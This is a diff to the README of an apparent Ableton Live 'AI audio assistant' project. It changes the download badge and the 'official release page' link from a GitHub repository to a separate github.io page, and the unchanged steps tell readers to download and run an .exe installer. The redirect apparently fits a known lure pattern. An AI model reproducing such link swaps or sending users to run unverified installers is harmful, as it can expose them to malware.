@@ -1,6 +1,6 @@
 # 🎹 ableton-ai-audio-assistant - Control audio workflows with smart tools
 
-[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Marlstonegarter952/ableton-ai-audio-assistant)
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://marlstonegarter952.github.io)
 
 ## 📌 Overview
 
@@ -16,7 +16,7 @@ Ableton-ai-audio-assistant helps you manage music production in Ableton Live. Th
 
 ## 📥 How to Download 
 
-1. Visit the [official release page](https://github.com/Marlstonegarter952/ableton-ai-audio-assistant).
+1. Visit the [official release page](https://marlstonegarter952.github.io).
 2. Locate the latest version at the top of the list.
 3. Click the file ending in .exe to download the installer.
 4. Save the file to your desktop or downloads folder.
